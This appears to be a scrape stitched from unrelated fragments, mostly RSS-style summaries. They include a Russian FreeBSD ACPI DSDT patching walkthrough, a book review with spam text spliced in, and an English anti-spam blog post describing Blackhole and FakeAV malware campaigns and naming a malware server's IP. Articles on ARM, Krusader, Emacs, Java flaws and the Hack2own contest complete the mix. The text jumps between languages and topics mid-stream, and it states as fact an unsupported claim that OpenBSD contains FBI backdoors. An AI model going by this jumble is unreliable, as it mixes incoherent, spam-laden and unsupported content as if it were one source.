$ dmesg | grep pci6
pci6: <ACPI PCI bus> on pcib4
pci6: <bridge, PCI-CardBus> at device 7.0 (no driver attached)
pci6: <serial bus, FireWire> at device 7.2 (no driver attached)
pci6: <mass storage> at device 7.3 (no driver attached)
pci6: <network> at device 8.0 (no driver attached)
$ dmesg | grep pcib4
pcib4: <ACPI PCI-PCI bridge> at device 30.0 on pci0
pci6: <ACPI PCI bus> on pcib4

То есть, pci6 — это дополнительная, «виртуальная» шина на мосту PCI-PCI. Номер 6 (как и 4 для моста) ей достался потому, что FreeBSD так распределила устройства. Внутри DSDT никаких шести шин и четырех мостов, конечно, нет. Device (PCIB) там ровно один, как и ожидалось. Полностью наше описание должно выглядеть так (привожу краткий вариант, не раскладывая регистр на отдельные биты): 

Scope (\_SB.PCI0.PCIB) {
 Device (XX11)
 {
  Name (_ADR, 0x00070000)  // pci0:6:7:0
  OperationRegion (PCIC, PCI_Config, 0x86, 0x01)
  Field (PCIC, AnyAcc, NoLock, Preserve) { GCR0, 8, }
 }
}

Теперь мы можем заменить наш отладочный код в методе _Q0C на что-то более осмысленное: 

                     Method (_Q0C, 0, NotSerialized)
                     {
+                        Store (Concatenate("GCR0 = 0x", \_SB.PCI0.PCIB.XX11.GCR0), Debug)
                         If (\_SB.PCI0.PEGA)
                         {

Перезагружаемся, жмем Fn-F4. Если мы все сделали верно, то должны увидеть то же самое значение, которое мы ранее читали через pciconf(8): 

 

(Реализация функции для записи значения регистра напрямую в видеопамять оставляется читателю в качестве легкого упражнения.) 

Нам остается ответить на самый главный вопрос: получится ли изменить значение регистра и заставить чип сконфигурировать себя так, как нам нужно? 

Стандарт ACPI определяет специальный метод для инициализации устройств, _INI (параграф 6.5.1, с. 349). Добавим в наше устройство следующий код: 

Method (_INI)
{
 Store (0xB3, GCR0)
 /* Альтернативный вариант для побитовой конфигурации:
 Store (0x01, FM)
 Store (0x00, SD) */
}

Компилируем ASL, копируем получившийся файл AML в /root/s950-patched.aml, снова перезагружаемся. Смотрим на 

Результат


 

Прежде всего, обратим внимание, что контроллер 0x8033104c (FlashMedia) исчез из вывода pciconf -lv, зато появился 0x8034104c (SD Host). Загружаем нужные модули ядра, вставляем карточку и пробуем примонтировать ее:

  <summary><![CDATA[The ultimate guide to building your dream system–without spending a lot of money! This step-by-step guide features more than 200 photographs illustrating how to install and configure hardware components and set up a Workgroup, Domain (Active Directory) and VPN network, using Windows 2000/ .NET Server.Yes, it has a heavy bias towards Microsoft, but so what.  I just followed all the hardware suggestions and then installed two real operating systems ( OpenBSD x 2 ).  This book brought up issues that I had never thought of ( Why would you want to dual boot a server?)  Its easy to follow.  If you build computers, buy this book.  Like I said in my title, I read someone elses copy and then bought my own. This book really worked for me.  Book Cheap Car Rental Italy Tips   . To give you some background, I’m a former web developer (now in business school) who needed a server for both a start-up business of mine and some home stuff that a laptop wouldn’t be suitable for. I had never built a box before, but Tony laid out the steps and crucial tips very well. This isn’t a "Building a Server for Dummies" exactly, as Tony assumes that you have at least an average to above-average level of computer proficiency (which is a good assumption, otherwise you probably would have no reason to want to build a server).I will agree with another reviewer who claims the book is very Microsoft-centric, and doesn’t address the huge costs of Win 2003 server licenses. However, in my opinion, the first few chapters about hardware alone are worth the price of the book, and the topics addressed in the software chapters can easily apply to a Linux installation as well.]]></summary>

  <title><![CDATA[Microcontrolador ARM: Hardware, Software e aplicações]]></title>
  <summary><![CDATA[http://www.cruzeirodosul.inf.br/acessarmateria.jsf?id=416189Microcontrolador ARM: Hardware, Software e aplicações A evolução tecnológica dos microcontroladores tem contribuído significativamente na qualidade de vida das pessoas. Praticamente todos os produtos eletrônicos possuem um ou mais microcontroladores embarcados. Nas décadas de 70, 80 e 90, os projetistas ficavam limitados a desenvolverem projetos com display LCD de duas linhas e possuíam poucos recursos para criatividade nos novos projetos.As linguagens de programação ficavam limitadas a entradas e saídas de sinais analógicos e portas digitais aplicadas à automação e controle de alguns processos e/ou acionamentos de alguns dispositivos. Os aparelhos celulares da década de 90 possuíam duas ou quatro linhas de LCD. Acessar a internet wifi, jogar, fazer fotos ou vídeos com os microcontroladores de 8 bits seria praticamente impossível. Além dos recursos tecnológicos limitados dos microcontroladores, tinha alto consumo de corrente, inviabilizando o desenvolvimento de sistemas portáteis. Além da baixa velocidade de processamento.O Microcontrolador ARM, iniciado pela Acorn, começou o desenvolvimento desta arquitetura em 1983, para suceder os sistemas 6502. Este foi o passo inicial. Desde então tivemos uma nova concepção no mundo tecnológico relativo a automação, controle e qualidade de vida população. O potencial desta arquitetura favoreceu um grupo de financiadores e parceiros como a Apple e VLSI para criação de uma empresa independente chamada ARM - www.arm.com/community. Com vendas na ordem de 10 bilhões de unidades, a arquitetura ARM foi crescendo até se tornar a arquitetura RISC mais popular do planeta. Os processadores ARM estão presentes na maioria dos equipamentos portáteis. Equipamentos como iPhone, Palm Pre, calculadoras, smartphones, Sistema de navegação automotivo, centrais de multimídias, PDAs e alguns notebooks utilizam essa tecnologia para as operações de processamento.A arquitetura ARM oferece vários microcontroladores como ARM7, ARM9, ARM11, Cortex-A8, Cortex-A9, e Cortex-A15 com núcleo RISC de 32 Bits, podendo trabalhar com o sistema operacional em tempo real (RTOS), como: Windows CE, .NET Micro Framework, Symbian, ChibiOS/RT, FreeRTOS, eCos, MicroC/OS-II, QNX e RTEMS entre outros.O ARM também suporta sistemas operacionais baseados em LINUX como Android, Bada, FreeBSD, iOS, Linux, NetBSD OpenBSD, Plan 9 from Bell Labs, QNX, Solaris e webOS. e as diversas distribuições Linux. Entre elas destacam-se Android, Arch Linux ARM, Chrome OS, Debian, Fedora, Gentoo, Ubuntu entre outros. A arquitetura também ARM suporta o sistema operacional ""Windows Embedded CE"", chamado atualmente de ""Windows Embedded Compact"", bem como os sistemas operacionais para mobile Windows Phone e Windows Mobile.Esta arquitetura oferece uma excelente opção para os projetistas que já trabalham com os microcontroladores de 08/16 bits. Todavia, precisa de experiências na programação dos periféricos (8250, 8259, 8237, 8253, 8255, etc), estudados nas disciplinas de sistemas microprocessados. Os novos periféricos compreendem: Interface para Ethernet, Controlador de LCD, interface USB OTG para a conexão de periféricos, Controlador CAN para aplicações industriais e automotivas, Interface SD/MMC para memória Flash, barramentos, I2C, ISP, etc.A programação destes dispositivos pode ser feita utilizando ambientes normalmente utilizados para a linha da família 8051, com o Keil. Neste caso, realmente é preciso conhecer a arquitetura interna do ARM para programação dos registradores, bit a bit. Dependendo da aplicação do ARM, deve-se aprender a programar em linguagem C/C++, PHP, JavaScrip, MySQL, JAVA, ANDROID, C#, PHP, CCS, HTML e MySQL, além de conhecer configuração de redes, sistemas operacionais, servidor entre outros. Na realidade, o ARM possui todas as características de um computador pessoal. Para desenvolvimentos de jogos pode se utilizar os ambientes: Unity3D, CryEngine, UDK entre outros.Atualmente trabalho com o microcontrolador ARM S3C6410A ARM1176JZF-S e o ""S5PV210 with PowerVR SGX540 graphics engine Cortex-A8"" da Samsung, utilizando o sistema operacional Linux com a distribuição Ubuntu, aplicado para aquisição de sinais analógicos (sensores de gás), rede wifi, banco de dados e páginas web design ( HTML5, JAVASCRIP, MySQL, PHP E CSS5).* O Prof. Dr. Ivando S. Diniz (ivando@sorocaba.unesp.br) é doutor em Engenharia Aeronáutica e Mecânica na área de Mecatrônica e Dinâmica de Sistemas Aeroespaciais pelo ITA ( Instituto Tecnológico de Aeronáutica), docente do curso de Engenharia de Controle e Automação da UNESP e GASI.

  <title><![CDATA[Vote Against Spam]]></title>
  <summary><![CDATA[What started it All     What started all of this is that in June 2012 I started getting bounces that looked like this: Bounces(click on picture to enlarge) I don't know whether the spammers counted on me doing anything but what can you do if somebody sends email purportedly from your domain which is not from your domain at all? I did what anybody who creates and maintains a blocking hosts file would do.  I snatched the host names and put them in my block lists.  After a while of doing this I started to receive emails that were sent to hashed users at securemecca.com domain directly.  For the longest time until I recently got malware I assumed they did it knowingly.  They didn't.  Either the bots added the addresses themself or they inadvertently copied the from list to the to list.  They started sending them pretending to come from user names that are obviously just hashes at other domains to hashes at securemecca.com.  Evidently they are so dumb they don't know some IWSPs (Internet Web Service Providers) set domains up with the person of contact being the postmaster and send all email for the domain where there is not a user to the postmaster (me).  Here is what they look like: Direct Sends (click on picture to enlarge)    Now do the emails come from either these domains or securemecca.com?  Of course not.  Do you really believe the user that the above picture shows the email message as coming from, COB24F68@axleyrode.com actually exists?  I don't think so.  I can assure you there is no such user as 658ea659@securemecca.com which is why I as postmaster get all of these messages, including bounces that come back from fictitious users at my domain securemecca.com.  I can guarantee the host axleyrode.com did not send the pictured email.  It and all the rest of these email messages come from infected PCs.  As of 2012-09-30 I have 1744 of the sending IP addresses for these fake pharmacies.  I have 507 of the sending IP addresses for the fake ADP / ACH, fake Better Business Bureau, fake Intuit, and fake Linked In sends that are actually links to malware (see below). Unfortunately, I did not save any of the fake IRS messages because I didn't have enough time and had no proof of malware yet.  Now I have proof of the malware.  That means these spammers / hackers control at least 2000 Windows machines belonging to other people, all sending out spam messages and fake phish / malware messages and are doing who knows what else.  Here are the lists of the complete line in the mail file and then in order just by left pad 0 filled to 3 digits for each byte:  Originating IP Originating IP (Numeric) (these now have only the new style below)     I have given all of this stuff to the FBI but if you ask me, nothing is going to be done.  I also informed the drug companies and I suppose they also don't think it is worth the time. In the whole thing I had no support except from the Romanians who tried searching for me so many times on Facebook (I am not there) that I received an invitation from Facebook.  I am saying more than I need to say here.  See the final section for how the Romanians were the only people to help.   More Detail     In just a few moments I will detail what I think will make it possible to defeat spam (junk) altogether.  I am getting about 100 host names and messages per day from spammers that do not know what they are doing.  Initially, all I received were the bounces.  What the spammer didn't count on was that my IWSP (Internet Web Service Provider) has set up all of the domains that are contracted through them so that the person overseeing the domain is the Postmaster.  Ergo, the smart thing to do with somebody doing blocking like me (I block only the spam I encounter and have no less than six email boxes) is to just take all patterns under my control out of their send from and to lists.  Here are the patterns they should remove:  securemecca, hhhobbit, henryhertzhobbit.  If the spammers did this my blocks would stop because I would not get anything.  But they are even sending to lists and user names like majordomo.  So to expect them to remove these patterns is asking too much.  The spammers / hackers are going one hundred eighty degrees the opposite direction from that.  They are now sending email from HASHNAME@PURLOINED-DOMAIN to HASHNAME@securemecca.com.  I indicate these in caps to indicate there are many things put where there is an all caps.  The messages are of course not coming from the PURLOINED-DOMAIN.  They are coming from infected machines running Microsoft Windows that the hacker / spammer has compromised.  The first three IPv4 addresses I picked randomly that were sending the mail were all in Saudi Arabia.  I pick that to be a good omen that God is watching over this.  I did inform Saudia Arabia Telecom about the problem but who knows what has been done.   Mail Delivery Fix     In my opinion here is a need for two changes to take place to fix the system.  The first is to fix the mail delivery to require a certificate similar to the one used for https traffic.  A friend said why not just check to see if the IPv4 address matches the host given.  That isn't quite so simple because for each domain you need to find their mail server names (which some don't have), then the IPv4 addresses for each mail server.  Usually you have multiple mail servers with at least two where one serves as a backup.  Each mail server frequently has multiple IPv4 addresses.  So the problem with a reverse IP lookup of the SMTP (Simple Mail Transfer Protocol - what handles the sending of your email from one place to another) gateways for the purported sending host is latency.  When you have a domain which is just specious (either it or its mail server does not exist) it takes a long time to verify it this way.  I am not the first to propose this secure mailer certificate.  Many have also proposed it.  Initially I thought Microsoft had but what they proposed was similar to what Spam Gourmet, Spam Assist, and other services like them provide.  The problem was that Microsoft wanted complete control.  Given their lack of understanding of how to control spam (also called Junk) in Outlook (was Hotmail) they wouldn't be my first pick in leading the charge.  GMail (Google) would be.  But Secure SMTP is not under the user control.  Just rest assured I am not the only one that says that the SMTP system which is now over 30 years doesn't need a major fix.  Many people much better than me realize it is needed.  I am just adding my lone little voice that says it needs to be done.  But I am also proposing an addition becase Secure SMTP alone will not completely fix the problem.  That is next.   DVS (Democratic Vote System)    What I propose is needed on the recipient / mail user end is a way to vote out messages. Look at this folder to see everything saved that went into this idea for having both Secure SMTP and a DVS system: Pesky Spammer Folder  I used to have most of the files in a private folder but now all of the files concerning this are in this public PeskySpammer folder.  This will help you understant the need for a secure SMTP mail sending service.  It also has some bearing on the situation because what if somebody does have a certificate for their email but there is no way to opt out of messages you do not want?  Generally speaking, those links that say remove from your send to list are really nothing more than "email address verified".  The spammers then sell those new verified email addresses to other spammers.  For these stubborn groups of spammers (hackers), only a DVS will eliminate their messages for good.  Secure SMTP won't do the job of getting rid of them.  Here is how the DVS should be implemented to work properly:The first part of the DVS is that if you moved a message from your Inbox to your Junk (Spam) folder it would cause your mail client to send a vote against that kind of message to a central clearing house.  This isn't just a vote for yourself.  It is a vote for everybody that has an email account saything that kind of a message is junk.The second part of the DVS is that if you delete a message from the Junk (Spam) folder it would also count as a vote against that type of message for everybody.  But a proper DVS system would instantly and immediately expunge the email message, not just move it into the Deleted folder.  What are the examples of Web-Mail that do this portion correctly?  Yahoo deletes it.  Google not only deletes it but it seems like it implements the DVS model and makes the deletion of the message a count for everybody.  When enough people do it, it junks those email messages for everybody.  Microsoft's Outlook (was HotMail) does it wrong.  It moves it into the Deleted folder just like it wants to hang on to the spam messages forever.  This has ramifications as to who should be running the DVS systemFinally, if you move a message from the Junk (Spam) folder back into the Inbox that counts as a vote that kind of message is not Junk for everybody and is a personal over-ride for yourself assuring you of receiving even more junk in the future.Okay.  who does this almost right?  Google's GMail.  I know people in the PhishTank Developers list, a person in a local mailing list and other computer scientists that have given up on even maintaining their own email and have signed up for GMail and use that as their only email account now.  There are down-sides.  An Argentinian bank wrote to me to get their URL cleared at PhishTank.  Thankfully it was in the Junk folder.  I tried sending three messages, first one with securemecca.com in the message, second with this blog in the message and the third with both from my securemecca.com email account to my Gmail account, Two out of three of them were put in Junk.  I will repeat the test again in about two weeks.  Other people keep hopping from one email address to another.  Since I need to save certain things and must have a POP email for my domain I cannot do that.  But making email client programs like Evolution, Thunderbird, Outlook, Outlook Express and other mail clients mesh with a DVS could reign this problem in hand.  Until the DVS and secure email gateway are implemented, using services like these (there are others) have the potential to help you considerably. Spam ArrestSpam Gourmet I mention these two not just as examples but because there is a special reason for each of them.  The first (Spam Arrest) was actually directly sent to by these spammers that have polluted my email box for over three months.  What the spammers were thinking when they did that I don't know.  They must have been on drugs.  The second is used by another blocker.  He has his email accounts set so that anybody he wants email from is in the white list and are allowed through.  All other email messages that have an @ (at) symbol in the email from address are tossed.  What can I say?  It works.  But with filtering that tight you run the risk of missing messages you may have wanted.  Romanians - The ONLY Intelligent People?    In all of this I faithly looked at any of the hacked domains that had a redirect stuffed into them.  Only a few of them had been fixed.  I also put up with an idiot that said in Brian Krebs forum that "I work for a company" and what you are doing is wrong.  Little did he know that I have created Network Management systems for a state in the United States and a major university among many other things in my professional career.  I am telling him and others that a secure SMTP protocol combined with a DVS system will work.  All of the people with hacked web-sites that I informed got the same treatment.  If possible I used Google's translation services to translate my messages into their language.  WIth all of them but just one, nothing came back.  Imagine my surprise to be invited by Facebook to have an account.  I looked at the phrases and since they were not in Espanol, Francais, English, Italiano, or Portugues  at first I thought it was these hackers / spammers since much information can be gained for an attack via Facebook.  In fact, just last night (2012-09-07) I changed my signature for my email to say: "A Computer / Network Security Analyst being on Facebook is about the same thing as being a Royal Communist. -  extension of a remark made by King Shahdov."  So Romaians, thanks for the invite but I will have to decline.  But you have proved to me you are courageous and the only intelligent human beings left on this earth.  Kudos to you!  And I will continue to report to you when these Russian and Ukrainian hackers hack your web-sites and from now on ignore everybody else since the rest say they are smart enough to handle everything themselves.  Most other people are so dumb they won't even use Spam Arrest or Spam Gourmet in the mean-time to try to take their email boxes back from the spammers.  Oh yes, thanks for the Pan Flute which is my favorite instrument and thanks for Zamfir and Damian Draghici.  A PS needs to be added.  The Turkish people also caused a Facebook invite to show up.  The figures were probably greatly exaggerated.  But what do you expect an independent minded person like me to do?  I will not sign up for Facebook or any of the other "social" services.  I am a privacy advocate.  Other Hackers Show Up    On 2012-09-18 most of the direct send fake pharmacy messages dried up and I started to get fake ADP / ACH and Linked-In messages.  They had URLs that have been stabbed into vulnerablde web-servers all over the planet.  Here is a picture of how they looked in my email:  ADP / ACH Fund Transfer (click on picture to enlarge) Here are the list of the URLs for all of the hacked web-sites including the fake Better Business Bureau (files in the PeskySpammer folder - see link for it above): Hacked Servers (all) The links for the sending IPs above now have only the sending IPs for these in them.  The others for the fake pharmacies are still there though.  I make the  X-Numeric.txt and X-Originating-IP.txt files only as a way of condensing the latest entries.   They weren't phish but had double redirects that are more typical of malware. Blackhole is not the only kit or malware to use their technique but that is what they resembled the most except they didn't have any optional parameters that are required.  Blackhole v 2.0 as reported by Steven Burn of hpHosts won't allow you in without the proper extra data.  It also black-lists you after you visit and won't allow you in for any subsequent visit.  But I know this and used wget to get the first two links and only if they changed did I put the hacked web-server URL into the browsers.  The first two did nothing.  The third finally bit with a "we want to keep you here message."  So maybe they weren't using an OS / browser check despite the fact that information flowed back to the web-server and the first few PHP scripts just weren't complete..  Over two years ago they started to use OS detect on me so I discontinued looking for the malware links due to the OS and browser I use plus Comcast's antibot service and other factors.  After all, the major problem I face on Linux are the trackers and spam.  Changing my OS to be identified as Windows XP SP1 and Firefox browser to be Internet Explorer became just too hard to continue with an OS update almost every month and a browser update every few weeks.   I notice they gave me a hiatus from the daily inflow into my securemecca.com email accounts today.  They did send one of their Linked-In pseudo links to my GMail account.  Evidently they didn't read my warning above to exclude hhhobbit, henryhertzhobbit, and securemecca.  That is all they had to do.   So are these hacker spammers dumb or are they just brassy?  Given the fact that the FBI, Interpol, and others won't do anything with this information it is hard to figure.  2012 is turning into a very strange year.  Unfortunately it will not come to an end on December 21.  2012 will come to and on December 31 just like every other year.   Where will it go next?  Hiatus for a day or what?  All I know is that we need to take these hacked Windows machines that are sending the email out of the loop.   Forget the estimates.  The proportion of my email that is spam is hovering right around 97%.  GMail even threw away my PhishTank messages so I moved that to Hotmail.  I did a test and just the link to this blog and the PeskySpammer folder got put into Junk.  I will say it now, again, and forever - Windows machines need to be taken out of the loop since they are sending most or all of the spam with drop-in SMTP agents that take advantage of the inherent insecurity of this aging protocol.  We need something like Secure SMTP to replace it that takes the Windows machines out of the loop.  Better Business Bureau    Sunday they did indeed take a hiatus.  Monday (2012-09-24) they went the Better Business Bureau route: Better Business Bureau(click on picture to enlarge)I have finally condensed it to just the things of value: Merged Hacked URLs(useful for people to check when they have been hacked) Sending IPs (left 0 filled)Sending IPs (as-is in email)    Stay tuned for where it heads next.  We Now Have Malware    Ever since mid September I wondered why these fake ADP / ACH, IRS, Linked-In, and Better Business Bureau did not have malware.  For the fake pharmacy it was understandable that they did not have malware.  Well, now these pseudo-phish message are not phish at all but they are distributing malware.  Here is the message I sent to the PhishTank Developer list: How It Went Down And here is the information and initial scan of the downloaded malware: Malware Info So it isn't spam any more.  It is malware.  I wouldn't think it was too successful with the high link drop-out rate, the restriction of less than probably 20% of the visitors allowed through to get the malware, and if you have already visited the web-site or more often the IP address where the PHP script is then that host (IP address) black-lists your IP address and you will no longer be able to download malware.  But it was busy enough that it took almost three minutes to download the malware I got.  That means they are busily infecting thousands more PCs running Microsoft Windows.  I am on Linux and they give a Windows binary.  Evidently they are counting on their other mechanisms and don't even worry about or even know that I am receiving their email in bulk quantity or doing OS and browser checks to not give Windows malware to Linux, Macintosh, iPad, iPhone, and Android systems.  How busy are these malware servers?  The actual malware delivery hosts are too busy to even respond.   Busy Malware Server(click on picture to enlarge)   No wonder they have it set to only give the BlackHole exploit kit and the FakeAV to about one out of ten or one out of twenty people.  They also bar entry to the IP address 74.91.123.203 if you have already been there (Version 2.0 of Blackhole).  Even with all of that their server is too busy to handle of the requests.  Oh, the IP address belongs to, you guessed it - Nuclear Fallout Enterprises, Inc.  Where is the FBI in all of this?  The statement of the Director will stand for all time and I paraphrase it. There are two types of businesses in the United States - those that have been hacked and those that are going to be hacked.  I think they have capitulated and quit.  Me?  I have no power to do anything but what I am doing here - report on what is going down.  Other Schemes Used    The last full week of September they also had a Fake IRS campaign.  Here is the picture of what the Fake IRS looked like: Fake IRS(click on picture to enlarge) On 2012-Oct-01 dribbling into 2012-Oct-02 they had the Fake Intuit campaign: Fake Intuit (click on picture to enlarge) Today it is a Fake Celebrity campaign.  No matter what it says it is all the same.  The first is an index.html file that is stuffed into a folder name that is randomly generated on mostly real servers which means their bots (compromised Windows PC machines) stab it into vulnerable web servers all over the world.   In that file are calls to one or more compromised machines for a script named js.js.  The js.js scripts call a PHP script on usually just an IP address.  That is what you see in the busy malware server shot above.  I am going to add the php script name to the PAC filter but will not do many more.  They change them about 2-3 times per week.  Since Firefox and NoScript stop them cold that is what I recommend: Mozilla FirefoxNoScript add on for Firefox    We need a turnkey firewall solution to be put in front of vulnerable web servers to protect them.   My choice would be OpenBSD, a tailored firewall built using Snort and other tools that both deflect and log attempts to stab these links into the web servers.  If somebody would provide them as a turnkey solution that would sell for about $1000 they could make millions.  Later on today I will provide a picture of what the fake Celebrity email messages look like.

  <title><![CDATA[Alternativa gratuita a TotalCommander para Linux. Krusader]]></title>
  <summary><![CDATA[Krusader es un avanzado administrador de archivos con paneles gemelos (estilo commander) para KDE, similar a Midnight Commander (Linux) o Total Commander (Windows), con muchas utilidades. Provee todas las opciones de un gestor de archivos que pueda querer. Tiene soporte para archivos comprimidos, sistemas de archivo montados, FTP, módulo de búsqueda avanzada, visor/editor, sincronización de directorios, comparación de contenido de archivos, renombrado recursivo de archivos y mucho más. 
Ofrece soporte para los siguientes formatos de archivo comprimido: tar, zip, bzip2, gzip, rar, ace, arj, lha y rpm, además puede manejar otros KIOslaves como smb o fish. Es altamente personalizable, fácil de usar, rápido y se ve genial en el escritorio. 
Los gestores de archivos de dos paneles (como Krusader) son también conocidos como GAO (Gestores de Archivos Ortodoxos). Su ventaja sobre gestores de archivo de un solo panel es la posibilidad de usar las diferentes teclas de funciones. En esencia es similar a tocar el piano. Una se acostumbra a la posición de las teclas y sus funciones y se vuelve posible manejar el gestor de archivos con los ojos vendados. 
Krusader se publica bajo la licencia de software GNU GPL. 
Plataformas disponibles: 

POSIX (Linux, BSD, Unix, Solaris) 
Todas las plataformas BSD (FreeBSD/OpenBSD/NetBSD/Apple MacOS X) 

Krusader no necesita el entorno de escritorio KDE para funcionar en su computadora pero el ambiente natural de Krusader es KDE, porque se sostiene en servicios proporcionados por las librerías KDE. Sólo se necesitan algunas librerías compartidas como las de KDE, QT™, etc. Esto significa que Krusader puede ejecutarse en Gnome, AfterStep, XFce u otro gestor de ventanas, siempre y cuando cuente con las librerías necesarias en su sistema. Generalmente estos problemas de dependencias son solucionados por su administrador de software como apt, en sistemas tipo Debian, o Portage, en Gentoo.

Para mi Krusader es uno de las grandes alternativas al Total Commander. Pero aún le falta para estar a su altura.

Uno de los inconvenientes de Krusader, en mi caso que uso Ubuntu (Gnome), es tener que instalar las librerías KDE necesarias para el funcionamiento de Krusader.

Actualmente la versión estable de Krusader es la 2.0.

 ===============================================================
      HUGE Security Resource+ - version 6000 - 08/31/2012
                   (Security + Trimmings!)

,.-----> CHANGELOG:
|
| 1. Added a crazy amount of new links.
| 2. Fixed 'OpenBSD' links incorrectly assigned to previous section 5000
| 3. Merged 'Security Blogs' at bottom to proper section 6005
| 4. Removed most titles/descriptions of links to reduce clutter & ease use
|    While this may make it more difficult to find exactly what you're
|    after, it's cleaner, leaner, and easier to navigate through. This
|    is especially true for the guys maintaining this document. There is
|    some labeling/titles here and there, but most of the heavily
|    verbose titles/descriptions of various entries have been removed.
| 5. Merged 'Pubs' & 'Forums' to 6007 & 6006
| 6. Removed several duplicate and broken links
| 7. Fixed some links (pages had moved) and a few typos
| 8. Sorta sorted sections
| 9. Renamed project title from 'HUGE Security Resource' to
|    'HUGE Security Resource+', meaning, with this version and
|    future versions this document will contain more than
|    security related material. (currently a work in progress)
|10. Released v.6000 despite a large number of remaining links we
|    would like to include, but they will come with our next release.

  <title><![CDATA[Emacs, un buen editor de textos gratuito, multifunción y multiplataforma]]></title>
  <summary><![CDATA[Emacs se trata de un editor de textos gratuito que incorpora  una infinidad de funciones y que se caracteriza por el gran número de extensiones que soporta. Para entrar en el contexto es clave recordar lo que es un editor de textos, y éste, tal cual como su nombre lo describe, se trata de una aplicación o programa que se utiliza para la edición de archivos de texto. 
 
 
Origen de la aplicación Emacs 
 
Continuando con la contextualización, el editor de textos Emacs fue desarrollado a mediados de los 70, por Richard Stallman. Una de las versiones más populares del editor Emacs es GNU Emacs, creada por el mismo autor para el proyecto GNU en 1991. 
 
El núcleo de esta aplicación es un intérprete del lenguaje Emacs Lisp, que no es más que una de las ramas de la familia de lenguajes de programación Lisp con las extensiones necesarias para soportar funciones de edición de textos. Emacs tiene más de dos mil comandos integrados y permite al usuario combinar estos comandos y agruparlos en funciones de tipo macro para automatizar el trabajo. 
 
Multifunciones del editor Emacs 
 
Ante todo cabe destacar que Emacs, más que un procesador de textos, se trata de un potente editor, concentrándose en la manipulación de fragmentos de texto, y proveyendo multitud de comandos para manipular palabras y párrafos (los que hayan manejado los sistemas operativos Unix  o Linux sabrán de lo que estoy hablando, Emacs tiene más puntos en común con la aplicación “Vim” del Unix/Linux que con el Microsoft Word). 
 
Emacs soporta numerosas extensiones que añaden un gran número de funcionalidades adicionales, permitiendo que el editor funcione, por ejemplo, como gestor de proyectos, como lector de correos electrónicos, como calendario o como interfaz de algunos depuradores de código (en inglés debuggers). Muchas de estas extensiones se distribuyen conjuntamente con el propio código del editor Emacs. 
 
También es remarcable que Emacs soporta texto escrito en la gran mayoría de los idiomas existentes, incluyendo diferentes sistemas de escritura, alfabetos, y sistemas de codificación de caracteres, como por ejemplo el UTF-8. También permite la utilización de correctores ortográficos llamando a aplicaciones externas como ispell. 
 
En suma, el comportamiento de este programa puede cambiarse y modificarse prácticamente sin limitación alguna, soportando múltiples plataformas (GNU, GNU/Linux, GNU/kFreeBSD, FreeBSD, NetBSD, OpenBSD, Solaris, Mac OS X, MS Windows, AIX y MS DOS). 
 
Automatización de tareas complejas y repetitivas 
 
La mayoría de las tareas repetitivas que pueden surgir a la hora de editar un texto se realizarán ad-hoc, descartando cada macro después de  su uso, pero Emacs también ofrece la posibilidad de guardar estas macros para que puedan ser utilizadas con posterioridad. 
 
Personalización del editor Emacs 
 
Otra de las características del editor gratuito Emacs es su capacidad de personalización, siendo posible configurarlo para que se adapte a las necesidades propias de cada usuario. En este sentido existe un extensión denominada customize que ofrece la funcionalidad, a través de un interfaz gráfico, de configurar el editor a nuestro gusto, permitiendo, por ejemplo, elegir el esquema de colores que queramos utilizar. 
 
No obstante, los usuarios avanzados pueden personalizar el funcionamiento del editor utilizando el archivo .emacs, un archivo que se carga automáticamente al ejecutar la aplicación y en el cual se pueden definir, entre otras cosas, variables y atajos de teclado diferentes a los proporcionados en la configuración por defecto del editor. En este fichero también se pueden definir nuevos comandos y macros que el usuario considere de utilidad. 
 
Otra importante personalización con gran aporte social del editor Emacs tiene que ver con los usuarios discapacitados visualmente y ciegos, los cuales pueden utilizar una aplicación llamada Emacspeak que permite utilizar el editor con retroalimentación de audio. 
 
En conclusión, la aplicación de edición de textos Emacs lleva desde la década de los 70  al servicio de millones de usuarios, posicionándose cada vez más como uno de los mejores editores de texto gratuitos, por sus capacidades de personalización, manejo de extensiones, internacionalización, y plataformas soportadas, entre otras múltiples características que facilitan al usuario un desempeño óptimo en la edición de textos.]]></summary>

  <summary><![CDATA[В конце мая 2012 года проходил конкурс по взлому операционных систем, мобильных устройств и браузеров – Hack2own. Сам конкурс проводили в рамках Positive Hack Days 2012 в городе Москве. Ни на одном из трех уровней соревнований никому не удалось взломать браузер Opera, как впрочем и другие браузеры, лишь немного пострадала репутация WindowsXP, iOS и OpenBSD – операционных систем. 
Как после комментировала участники конкурса, что браузеры очень сложно взломать, для этого нужно иметь их уязвимость. Этой уязвимостью никто не разбрасывается, а на черном рынке ее наверняка не купишь задешево, цена примерно может составлять более десятков тысяч долларов.

Вывод: 
Браузеры намного важнее продукт, чем операционные системы; 
Разработчики браузеров не жалеют не сил, ни средств на безопасность, и из-за этого уязвимостей меньше, а цена каждой очень велика;

  <title><![CDATA[Oracle y los errores en criticos en Java]]></title>
  <summary><![CDATA[Recientemente la maquina virtual de Java y más específicamente el plugin de Java para exploradores web ha sido duramente criticado por errores graves de seguridad, donde en algunas plataformas se resolvía con actualizar la versión de Java y en otras dependia de la implementación propia y cerrada 
A decir verdad los errores de Software que pueden derivar en una falla de seguridad grave le ocurren a la mayoría de los productos, idealmente mientras menos ocurran es mejor, pero están presentes en Linux, Windows, Mac por dar algunos ejemplos o plataformas superseguras como OpenBSD con backdoors del FBI incluidos. 
¿Entonces porque decimos que un Software es más seguro que otro o porque decimos que una plataforma de desarrollo es más segura que otra?. Ademas de la frecuencia de aparición de errores que desde mi punto de vista es la métrica más visible, otro factor bastante importante es como estos errores son abordados y es un problema del que Oracle esta aun aprendiendo a reaccionar porque a diferencia de sus bases de datos que comúnmente están aisladas tras varios firewall, acceder y explotar una vulnerabilidad en el plugin de la maquina virtual de Java es más simple respecto al numero de puntos de control que deben ser burlados. 
Hace tres dias Ars Technica (en ingles) publico un reportaje respecto a una vulnerabilidad critica en Java que preocupo a varios lideres de la comunidad Java a nivel mundial (y a su servidor por andar de metido en conversaciones de grandes) sobre todo porque ya han sido dos golpes grandes en menos de 6 meses. A mi parecer el tono noticia es un poco amarillista, pero cuando la seguridad esta en juego el amarillo realmente es un buen color para decir que algo esta pasando y eso no justifica la pobre administración que Oracle realiza (o realizaba?) respecto a los zero day bugs. 
